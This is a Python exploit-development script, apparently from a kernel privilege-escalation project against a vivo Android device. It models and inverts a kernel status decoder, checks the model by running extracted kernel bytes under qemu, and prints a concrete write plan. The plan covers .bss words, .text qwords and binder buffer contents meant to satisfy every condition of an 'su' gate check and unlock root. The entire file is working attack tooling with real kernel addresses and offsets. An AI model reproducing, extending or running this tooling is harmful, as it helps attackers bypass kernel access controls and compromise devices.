#!/usr/bin/env python3
"""Model, verify and *invert* the vivo PowerMo status decoder, then emit the su-gate
write plan (ledger §176).

The gate allows `su` iff `q(1,10) != 0` (X@0x339c98 -> A(10)=0xd9ab3c -> 0xd9b498).
q()'s first condition is a bit of a u32 `S` produced by the decoder at 0x32bcbc out of
4 raw u32 in .bss (`0xffffffc00188f928`), and its next two fields (`base = S>>28&7`,
`b = S>>24&3`) select which qwords of the 96-byte .text island get XORed.  So the first
thing the bypass needs is: **make S have bit1 set and the (base,b) pair we like** -- and
those 4 words are in .bss, i.e. already writable by the existing primitive, no page
tables involved.  This script models the decoder, verifies the model against the real
kernel bytes running under qemu-aarch64, then searches for raw words that produce S.

Two independent methods, by design (memory: 推断交付前要两条来路取交集):
  (A) this Python model, written instruction-by-instruction from the disassembly;
  (B) tools/statedec_probe.c -- the extracted bytes executed under qemu.
`--verify` compares them over random and structured inputs and reports 应到/实到.

usage:
  python3 tools/sugate_solve.py --verify [N]
  python3 tools/sugate_solve.py --solve  --p 0x<kernel VA of our binder buffer>
"""
import argparse
import os
import random
import struct
import subprocess
import sys
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
PROBE = os.path.join(HERE, "statedec_probe")
QEMU = "qemu-aarch64"

RAW_VA = 0xFFFFFFC00188F928      # 4 u32, .bss  (measured writable segment)
ISLAND = 0xFFFFFFC000339DB8      # 96 zero bytes inside .text  (island = 12 qwords)
ISLAND_QW = 12
GATE = 0xFFFFFFC0003326B4

# --- the six conditions of q(which=1, id) ------------------------------------------
#  C1  S & (1<<1)                     != 0
#  C2  P = T[i0]^T[i1]^T[i2]          != 0
#  C3  0x32c710(P,0): page-aligned, in vmalloc window, find_vm_area(P), vm->flags has
#      no VM_USERMAP, and a writable PTE -- true for our own binder get_vm_area buffer
#  C4  crc32_le(0, &T[base], 32) == *(P + 8*(0x180 + min(b^base,6)))   (upper 32 bits 0)
#  C5  *(P + 8*k) == t ^ P ^ k        where t = T[i1], k = 128 + ((t>>18)&63)
#  C6  *(P + 8*k + 8) & (1<<id)       != 0


def decode(raw):
    """Model of 0x32bcbc. raw = 4 u32. Returns the decoded u32 S."""
    key = 0x55
    chain = 0
    out = 0
    for x7 in range(4):
        word = raw[x7] & 0xFFFFFFFF
        byte = (word >> (chain * 4)) & 0xFF
        x = byte ^ key
        lo, hi = x & 0xF, x >> 4
        lo6, hi6 = lo % 6, hi % 6
        sel = (lo6 + 1) % 6 if lo6 == hi6 else hi6
        na = (sel + chain + 2) & 7          # nibble index feeding the HIGH nibble of S's byte
        nb = (lo6 + chain + 2) & 7          # nibble index feeding the LOW nibble
        nib_a = (word >> (na * 4)) & 0xF
        nib_b = (word >> (nb * 4)) & 0xF
        obyte = ((nib_a ^ lo6) << 4) | ((nib_b ^ sel) & 0xF)
        out |= obyte << (x7 * 8)
        # next key: w2 = ((~key)&0xf) | (key & 0xf0); transformed = (~w2 & 0xf0)|(w2 & 0xf)
        w2 = ((~key) & 0xF) | (key & 0xF0)
        tf = ((~w2) & 0xF0) | (w2 & 0xF)
        key = tf if (x7 & 1) else w2
        chain = (hi + lo) % 7
    return out & 0xFFFFFFFF


def decode_qemu(samples):
    """Method (B): run the extracted kernel bytes under qemu-aarch64."""
    if not os.path.exists(PROBE):
        raise SystemExit("build tools/statedec_probe first (see --verify error text)")
    inp = "".join("%08x %08x %08x %08x\n" % tuple(s) for s in samples)
    p = subprocess.run([QEMU, PROBE], input=inp.encode(), stdout=subprocess.PIPE,
                       stderr=subprocess.STDOUT, timeout=120)
    lines = [l for l in p.stdout.decode(errors="replace").split() if len(l) == 8
             and all(c in "0123456789abcdef" for c in l)]
    if len(lines) != len(samples):
        raise SystemExit("probe returned %d lines for %d inputs; raw output: %r"
                         % (len(lines), len(samples), p.stdout[:200]))
    return [int(l, 16) for l in lines]


def verify(n=2000):
    rnd = random.Random(20261014)
    samples = [(0, 0, 0, 0)]
    samples += [(0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF)]
    samples += [(rnd.getrandbits(32), rnd.getrandbits(32), rnd.getrandbits(32),
                 rnd.getrandbits(32)) for _ in range(n)]
    # structured: each word a single nibble set, to walk the shift paths
    for pos in range(8):
        w = 0xF << (pos * 4)
        samples.append((w, 0, 0, 0))
        samples.append((0, w, 0, 0))
    got = decode_qemu(samples)
    bad = []
    for s, g in zip(samples, got):
        m = decode(s)
        if m != g:
            bad.append((s, m, g))
    print("decoder model vs real kernel bytes: 应到 %d / 实到 %d / 不符 %d"
          % (len(samples), len(got), len(bad)))
    for s, m, g in bad[:5]:
        print("  raw=%s model=%08x qemu=%08x" % (" ".join("%08x" % v for v in s), m, g))
    print("  raw=00000000.. -> S=%08x  bit1=%d base=%d b=%d"
          % (got[0], (got[0] >> 1) & 1, (got[0] >> 28) & 7, (got[0] >> 24) & 3))
    return len(bad) == 0


def key_of(x7):
    """The XOR key per iteration, as the code derives it (0x55 -> 0x5A -> 0xA5 -> 0xAA)."""
    return [0x55, 0x5A, 0xA5, 0xAA][x7]


def iter_chains(x7, chain, ok_byte):
    """For iteration x7 with chain `chain`: next_chain -> one raw u32 witness.

    The only coupling between the four iterations is next_chain = (hi+lo)%7, so the
    search decomposes over 7 states instead of over word prefixes (which is what made
    the first version explode).
    """
    key = key_of(x7)
    wit = {}
    for L in range(16):
        for H in range(16):
            byte_in = ((H << 4) | L) ^ key          # what the word stores at this byte
            lo6, hi6 = L % 6, H % 6
            sel = (lo6 + 1) % 6 if lo6 == hi6 else hi6
            na = (sel + chain + 2) & 7              # nibble -> high nibble of S's byte
            nb = (lo6 + chain + 2) & 7              # nibble -> low nibble of S's byte
            slots = {chain: byte_in & 0xF}
            if chain + 1 <= 7:
                slots[chain + 1] = byte_in >> 4
            elif byte_in >> 4:
                continue                            # top byte: the hi half reads as 0
            nxt = (H + L) % 7
            if nxt in wit:
                continue
            found = False
            for a in ([slots[na]] if na in slots else range(16)):
                for bq in ([slots[nb]] if nb in slots else range(16)):
                    if not ok_byte(((a ^ lo6) << 4) | ((bq ^ sel) & 0xF)):
                        continue
                    s = dict(slots)
                    s[na] = a
                    s[nb] = bq
                    w = 0
                    for p in range(8):
                        w |= s.get(p, 0) << (p * 4)
                    wit[nxt] = w
                    found = True
                    break
                if found:
                    break
    return wit


def check(raw, base, b, bit1=True):
    S = decode(raw)
    return (((S >> 1) & 1) == (1 if bit1 else 0) and ((S >> 28) & 7) == base
            and ((S >> 24) & 3) == b)


def solve(base, b, bit1=True):
    """4 raw u32 with S bit1 set, (S>>28)&7 == base, (S>>24)&3 == b -- or None."""
    ok0 = (lambda v: (v & 0x2) != 0) if bit1 else (lambda v: True)
    ok3 = lambda v: ((v >> 4) & 7) == (base & 7) and (v & 3) == (b & 3)
    anyv = lambda v: True
    ok = {0: ok0, 1: anyv, 2: anyv, 3: ok3}
    states = {0: []}                                # incoming chain -> witness words so far
    for x7 in range(4):
        nxt = {}
        for chain, pre in states.items():
            for c2, w in iter_chains(x7, chain, ok[x7]).items():
                nxt.setdefault(c2, pre + [w])
        if not nxt:
            return None
        states = nxt
    for pre in states.values():
        if len(pre) == 4 and check(pre, base, b, bit1):
            return pre
    return None


def plan(raw, P, idx=10, t=None):
    S = decode(raw)
    base, b = (S >> 28) & 7, (S >> 24) & 3
    i0, i1, i2 = b + base, ((b + 1) & 3) + base, ((b + 2) & 3) + base
    assert max(i0, i1, i2) < ISLAND_QW, "island indices exceed the 96-byte filler"
    if t is None:
        t = (128 + 3) << 18            # -> k = 131, i.e. P+1048
    k = 128 + ((t >> 18) & 63)
    m = min(b ^ base, 6)
    island = [0] * ISLAND_QW
    island[i0], island[i1], island[i2] = P, t, t
    crc = zlib.crc32(b"".join(struct.pack("<Q", island[base + j]) for j in range(4))) & 0xFFFFFFFF
    M64 = (1 << 64) - 1
    pl = {
        "S": S, "base": base, "b": b, "i0": i0, "i1": i1, "i2": i2, "k": k, "m": m,
        "island": island, "crc": crc, "t": t,
        "buf_at_P_plus_8k": t ^ P ^ k,
        "buf_at_P_plus_8k_plus_8": 1 << idx,
        "buf_at_P_plus_8*(0x180+m)": crc,
    }
    # re-evaluate every condition from the artifacts, the way the instructions do
    mem = {8 * k: pl["buf_at_P_plus_8k"], 8 * k + 8: pl["buf_at_P_plus_8k_plus_8"],
           8 * (0x180 + m): crc}
    pl["checks"] = [
        ("C1 S bit1", (S >> 1) & 1 == 1),
        ("C2 xor3 == P", (island[i0] ^ island[i1] ^ island[i2]) == P),
        ("C3a page aligned", P & 0xFFF == 0),
        ("C3b wrap window", ((P + 0x4004000000) & M64) <= 0x3FF0000B000),
        ("C4 crc slot hi32==0", crc >> 32 == 0),
        ("C4 crc value", mem[8 * (0x180 + m)] == zlib.crc32(
            b"".join(struct.pack("<Q", island[base + j]) for j in range(4))) & 0xFFFFFFFF),
        ("C5 xored pointer", mem[8 * k] == (t ^ P ^ k)),
        ("C6 id bit", mem[8 * k + 8] & (1 << idx) != 0),
        ("buf offsets < 4M (binder buffer)", max(mem) < 4 * 1024 * 1024),
    ]
    return pl



def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--verify", nargs="?", const=2000, type=int)
    ap.add_argument("--solve", action="store_true")
    ap.add_argument("--base", type=int, default=0)
    ap.add_argument("--b", type=int, default=0)
    ap.add_argument("--p", type=str, default="0x0")
    a = ap.parse_args()

    if a.verify:
        ok = verify(a.verify)
        print("VERDICT:", "model matches the kernel bytes" if ok else "MODEL WRONG -- do not use it")
        return 0 if ok else 1

    if a.solve:
        P = int(a.p, 16)
        raw = solve(a.base, a.b)
        if raw is None:
            print("no raw-word solution for base=%d b=%d -- try another (base,b)" % (a.base, a.b))
            return 1
        S = decode(raw)
        # confirm with method (B) as well, before we trust it enough to write to a device
        q = decode_qemu([tuple(raw)])
        print("raw words (write to .bss %x, 4 u32):" % RAW_VA)
        for i, v in enumerate(raw):
            print("  +%02x  %08x" % (i * 4, v))
        print("S(model)=%08x  S(qemu)=%08x  bit1=%d base=%d b=%d"
              % (S, q[0], (S >> 1) & 1, (S >> 28) & 7, (S >> 24) & 3))
        if q[0] != S:
            print("ABORT: the two methods disagree")
            return 1
        pl = plan(raw, P)
        print("\n== island qwords at .text %x (write via the §175 alias) ==" % ISLAND)
        for i, v in enumerate(pl["island"]):
            if v:
                print("  +%02d (i%d)  %016x" % (i * 8, i, v))
        print("\n== our binder buffer P = %016x (written from USERSPACE) ==" % P)
        print("  +%04d (8*k)      %016x   # C5" % (8 * pl["k"], pl["buf_at_P_plus_8k"]))
        print("  +%04d (8*k+8)    %016x   # C6 bit10" % (8 * pl["k"] + 8, pl["buf_at_P_plus_8k_plus_8"]))
        off4 = 8 * (0x180 + pl["m"])
        print("  +%04d (0x180+m)  %016x   # C4 crc32_le" % (off4, pl["buf_at_P_plus_8*(0x180+m)"]))
        bad = [n for n, okv in pl["checks"] if not okv]
        print("\n== condition re-check (each one re-evaluated from the artifacts above) ==")
        for n, okv in pl["checks"]:
            print("  %s  %s" % ("PASS" if okv else "FAIL", n))
        print("(base=%d b=%d k=%d m=%d t=%x crc=%08x) -> %s"
              % (pl["base"], pl["b"], pl["k"], pl["m"], pl["t"], pl["crc"],
                 "plan usable" if not bad else "ABORT: " + ",".join(bad)))
        return 0 if not bad else 1

    print("nothing to do -- pass --verify or --solve")
    return 0


if __name__ == "__main__":
    sys.exit(main())
